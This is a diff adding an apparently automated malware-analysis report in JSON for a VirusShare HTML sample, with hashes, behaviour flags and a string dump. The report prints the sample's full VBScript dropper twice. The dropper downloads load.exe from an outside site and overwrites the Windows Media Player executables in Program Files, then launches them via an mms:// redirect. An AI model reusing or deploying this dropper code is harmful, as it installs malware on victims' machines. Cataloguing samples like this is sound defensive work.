@@ -1,0 +1,78 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
+            "CreateObject": "May create an OLE object",
+            "Windows": "May enumerate application windows",
+            "adodb.stream": "May create a text file",
+            "msxml2.XMLHTTP": "May download files from the Internet",
+            "open": "May open a file",
+            "savetofile": "May create a text file",
+            "write": "May write to a file"
+        },
+        "macro": "<script language=vbs>\nset oHTTP = CreateObject(\"msxml2.XMLHTTP\")\noHTTP.open \"GET\", \"http://www.free3xmatures.com/del/nt/load.exe\", False\noHTTP.send\nset oStream = createobject(\"adodb.stream\")\nConst adTypeBinary = 1\nConst adSaveCreateOverWrite = 2\noStream.type = adTypeBinary\noStream.open\noStream.write oHTTP.responseBody\ndim a(7)\na(0)=\"Programmer\"\na(1)=\"Programe\"\na(2)=\"Programmi\"\na(3)=\"Programfiler\"\na(4)=\"Programas\"\na(5)=\"Archivos de programa\"\na(6)=\"Program Files\"\nfor i=0 to 6 step 1\ns=\"C:\\\\\" & a(i) & \"\\\\Windows Media Player\\\\wmplayer.exe\"\ns1=\"C:\\\\\" & a(i) & \"\\\\Windows Media Player\\\\mplayer2.exe\"\ns2=\"D:\\\\\" & a(i) & \"\\\\Windows Media Player\\\\wmplayer.exe\"\ns3=\"D:\\\\\" & a(i) & \"\\\\Windows Media Player\\\\mplayer2.exe\"\non error resume next\noStream.savetofile s, adSaveCreateOverWrite\non error resume next\noStream.savetofile s1, adSaveCreateOverWrite\non error resume next\noStream.savetofile s2, adSaveCreateOverWrite\non error resume next\noStream.savetofile s3, adSaveCreateOverWrite\nnext\n</script>\n<script language=\"javascript\">\nlocation.href = \"mms://\";\n</script>"
+    },
+    "filename": "VirusShare_1e8da5dee841949e7d4f78b8c264fa86",
+    "filesize": 1096,
+    "filetype": "HTML document, ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "1e8da5dee841949e7d4f78b8c264fa86",
+        "sha1": "d5d538c09e37ea59dda1a70250e545d6504767f0",
+        "sha256": "e537f1f08dd9b5e32fa2e4dd8b4db920799dbafc515ed4080ec943dd777510d5"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "<script language=vbs>",
+            "set oHTTP = CreateObject(\"msxml2.XMLHTTP\")",
+            "oHTTP.open \"GET\", \"http://www.free3xmatures.com/del/nt/load.exe\", False",
+            "oHTTP.send",
+            "set oStream = createobject(\"adodb.stream\")",
+            "Const adTypeBinary = 1",
+            "Const adSaveCreateOverWrite = 2",
+            "oStream.type = adTypeBinary",
+            "oStream.open",
+            "oStream.write oHTTP.responseBody",
+            "dim a(7)",
+            "a(0)=\"Programmer\"",
+            "a(1)=\"Programe\"",
+            "a(2)=\"Programmi\"",
+            "a(3)=\"Programfiler\"",
+            "a(4)=\"Programas\"",
+            "a(5)=\"Archivos de programa\"",
+            "a(6)=\"Program Files\"",
+            "for i=0 to 6 step 1",
+            "s=\"C:\\\\\" & a(i) & \"\\\\Windows Media Player\\\\wmplayer.exe\"",
+            "s1=\"C:\\\\\" & a(i) & \"\\\\Windows Media Player\\\\mplayer2.exe\"",
+            "s2=\"D:\\\\\" & a(i) & \"\\\\Windows Media Player\\\\wmplayer.exe\"",
+            "s3=\"D:\\\\\" & a(i) & \"\\\\Windows Media Player\\\\mplayer2.exe\"",
+            "on error resume next",
+            "oStream.savetofile s, adSaveCreateOverWrite",
+            "on error resume next",
+            "oStream.savetofile s1, adSaveCreateOverWrite",
+            "on error resume next",
+            "oStream.savetofile s2, adSaveCreateOverWrite",
+            "on error resume next",
+            "oStream.savetofile s3, adSaveCreateOverWrite",
+            "next",
+            "</script>",
+            "<script language=\"javascript\">",
+            "location.href = \"mms://\";",
+            "</script>"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": [
+            "http://www.free3xmatures.com/del/nt/load.exe"
+        ]
+    },
+    "time": "0:00:00.258414",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
